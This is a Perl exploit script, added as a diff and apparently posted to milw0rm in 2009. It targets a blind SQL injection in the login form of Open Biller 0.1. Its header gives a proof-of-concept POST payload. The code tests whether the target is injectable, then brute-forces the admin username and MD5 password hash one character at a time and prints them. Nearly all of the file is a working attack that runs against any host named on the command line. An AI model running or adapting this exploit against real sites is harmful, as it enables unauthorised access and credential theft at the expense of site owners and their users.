@@ -1,0 +1,248 @@
+#!/usr/bin/perl
+#***********************************************************************************************
+#***********************************************************************************************
+#**	       										      **
+#**  											      **
+#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
+#   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    
+#**							                                      **
+#**    											      **
+#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+#**					  ¡PROUD TO BE SPANISH!	                              **
+#**											      **
+#***********************************************************************************************
+#***********************************************************************************************
+#
+#---------------------------------------------------------------------------------------------
+#|       	   	   (Post Form login var 'username') BLIND SQLi exploit         	     |
+#|-------------------------------------------------------------------------------------------|
+#|                                    |    Open Biller 0.1    |		    	             |
+#|  CMS INFORMATION:          	      ------------------------	               	             |
+#|										             |
+#|-->WEB: http://sourceforge.net/projects/geekbill/			       		     |
+#|-->DOWNLOAD: http://sourceforge.net/projects/geekbill/		                     |
+#|-->DEMO: N/A										     |
+#|-->CATEGORY: CMS / Portal								     |
+#|-->DESCRIPTION: Open Biller aims to to be a the best open source billing                   |
+#|		system on the planet.The system is written in PHP/MYSQL...                   |
+#|-->RELEASED: 2009-05-31								     |
+#|											     |
+#|  CMS VULNERABILITY:									     |
+#|											     |
+#|-->TESTED ON: firefox 3						                     |
+#|-->DORK: N/A									             |
+#|-->CATEGORY: BLIND SQLi exploit						             |
+#|-->AFFECT VERSION: CURRENT						 		     |
+#|-->Discovered Bug date: 2009-06-09							     |
+#|-->Reported Bug date: 2009-06-09							     |
+#|-->Fixed bug date: N/A								     |
+#|-->Info patch: N/A									     |
+#|-->Author: YEnH4ckEr									     |
+#|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+#|-->WEB/BLOG: N/A									     |
+#|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.      |
+#|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		     |
+#---------------------------------------------------------------------------------------------
+#
+#------------
+#CONDITIONS:
+#------------
+#
+#magic quotes=OFF
+#
+#---------------------------------------
+#PROOF OF CONCEPT (SQL INJECTION):
+#---------------------------------------
+#
+#POST http://[HOST]/[PATH]/index.php HTTP/1.1
+#Host: [HOST]
+#User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10
+#Referer: http://[HOST]/[PATH]/
+#
+#username=%27+or+1%3D0%23&pass=1111&submit=Login
+#
+#username=%27+or+1%3D0%23&pass=1111&submit=Login
+#
+##############################################################################
+##############################################################################
+##**************************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!         ##
+##**************************************************************************##
+##--------------------------------------------------------------------------##
+##**************************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray, Evil1 and Spanish Hack3Rs community!##
+##**************************************************************************##
+##############################################################################
+##############################################################################
+#
+#
+use LWP::UserAgent;
+use HTTP::Request;
+#Subroutines
+sub lw
+{
+	my $SO = $^O;
+	my $linux = "";
+	if (index(lc($SO),"win")!=-1){
+		$linux="0";
+	}else{
+		$linux="1";
+	}		
+	if($linux){
+		system("clear");
+	}
+	else{
+		system("cls");
+		system ("title Open Biller 0.1 Blind SQL Injection Exploit");
+		system ("color 04");
+	}
+}
+sub request {
+	my $userag = LWP::UserAgent->new;
+	$userag -> agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+	$request = HTTP::Request -> new(POST => $_[0]);
+	$request->referer($_[0]);
+	$request->content_type('application/x-www-form-urlencoded');
+	$request->content($_[1]);
+	my $outcode= $userag->request($request)->as_string;
+	#print $outcode; #--> Active this line for debugger mode
+	#print $request->as_string; #--> Active this line for debugger mode
+	return $outcode;
+}
+sub error {
+print "\t------------------------------------------------------------\n";
+	print "\tWeb isn't vulnerable!\n\n";
+	print "\t--->Maybe:\n\n";
+	print "\t\t1.-Patched.\n";
+	print "\t\t2.-Bad path or host.\n";
+	print "\t\t5.-Magic quotes ON'.\n";
+	print "\t\tEXPLOIT FAILED!\n";
+	print "\t------------------------------------------------------------\n";
+}
+sub testedblindsql {
+	print "\t-----------------------------------------------------------------\n";
+	print "\tWEB MAYBE BE VULNERABLE!\n\n";
+	print "\tTested Blind SQL Injection.\n";		
+	print "\tStarting exploit...\n"; 
+	print "\t-----------------------------------------------------------------\n\n";
+}
+sub helper {
+	print "\n\t[!!!] Open Biller 0.1 Blind SQL Injection Exploit\n";
+	print "\t[!!!] USAGE MODE: [!!!]\n";
+	print "\t[!!!] perl $0 [HOST] [PATH]\n";
+	print "\t[!!!] [HOST]: Web.\n";
+	print "\t[!!!] [PATH]: Home Path.\n";
+	print "\t[!!!] Example: perl $0 'www.example.com' 'demo'\n";
+}
+sub brute_length{
+#Username length
+$exit=0;
+$i=0;
+while($exit==0){
+	my $blindsql="username='+OR+1=1+AND+(SELECT+length(username)+FROM+users+WHERE+ID=1)=".$i++."#&pass=1111&submit=Login"; #injected code
+	$output=&request($_[0],$blindsql);
+	if($output =~ (/Incorrect password, please try again./)){
+		$exit=1;
+	}else{
+		$exit=0;
+	}
+	#This is the max length of username
+	if($i>60){
+	&error;
+	exit(1);
+	}
+}
+#Save column length
+$length=$i-1;
+print "\t<<<<<--------------------------------------------------------->>>>>\n";
+print "\tLength catched!\n";
+print "\tLength Username --> ".$length."\n";
+print "\tWait several minutes...\n";
+print "\t<<<<<--------------------------------------------------------->>>>>\n\n";
+return $length;
+}
+sub exploiting {
+#Bruteforcing values
+$values="";
+$k=1;
+	$z=45;
+	while(($k<=$_[1]) && ($z<=126)){
+		my $blindsql="username='+OR+1=1+AND+ascii(substring((SELECT+".$_[2]."+FROM+users+WHERE+ID=1),".$k.",1))=".$z."#&pass=1111&submit=Login";
+		$output=&request($_[0],$blindsql);
+		if($output =~ (/Incorrect password, please try again./))
+		{
+			$values=$values.chr($z);
+			$k++;
+			$z=45;
+		}
+#new char
+	$z++; 
+	}
+return $values;
+}
+#Main
+&lw;
+print "\t#######################################################\n\n";
+print "\t#######################################################\n\n";
+print "\t##   Open Biller 0.1 Blind SQL Injection Exploit     ##\n\n";
+print "\t##           Blind SQL Injection Exploit             ##\n\n"; 
+print "\t##       ++Conditions: magic_quotes=OFF              ##\n\n";
+print "\t##               Author: Y3nh4ck3r                   ##\n\n";
+print "\t##      Contact:y3nh4ck3r[at]gmail[dot]com           ##\n\n";
+print "\t##            Proud to be Spanish!                   ##\n\n";
+print "\t#######################################################\n\n";
+print "\t#######################################################\n\n";
+#Init variables
+my $host=$ARGV[0];
+my $path=$ARGV[1];
+$numArgs = $#ARGV + 1;
+if($numArgs<=1) 
+	{
+		&helper;
+		exit(1);	
+	}	
+#Build uri
+my $finalhost="http://".$host."/".$path."/index.php";
+$finalrequest = $finalhost;	
+#Testing blind sql injection and magic_quotes (any error?)
+$send_post1="username=%27+or+1%3D1%23&pass=1111&submit=Login";
+$output1=&request($finalrequest,$send_post1);
+$send_post2="username=%27+or+1%3D0%23&pass=1111&submit=Login";
+$output2=&request($finalrequest,$send_post2);
+if ($output1 eq $output2)
+{    
+	#Not injectable
+	&error;
+	exit(1); 
+}else{ 
+	#blind sql injection is available
+	&testedblindsql;
+}
+#Bruteforcing length
+$length_user=&brute_length($finalrequest);	
+#Bruteforcing username...
+$user=&exploiting($finalrequest,$length_user,'username');
+#Bruteforcing password md5 hash...
+$pwhash=&exploiting($finalrequest,32,'password');
+#final checking
+if((!$user) || (!$pwhash)){
+	&error;
+	exit(1);
+}
+print "\n\t\t*************************************************\n";
+print "\t\t*********  EXPLOIT EXECUTED SUCCESSFULLY ********\n";
+print "\t\t*************************************************\n\n";
+print "\t\tAdmin-username: ".$user."\n";
+print "\t\tAdmin-password: ".$pwhash."\n\n";
+print "\n\t\t<<----------------------FINISH!-------------------->>\n\n";
+print "\t\t<<---------------Thanks to: y3nh4ck3r-------------->>\n\n";
+print "\t\t<<------------------------EOF---------------------->>\n\n";
+exit(1);
+#Ok...all job done
+
+# milw0rm.com [2009-06-10]
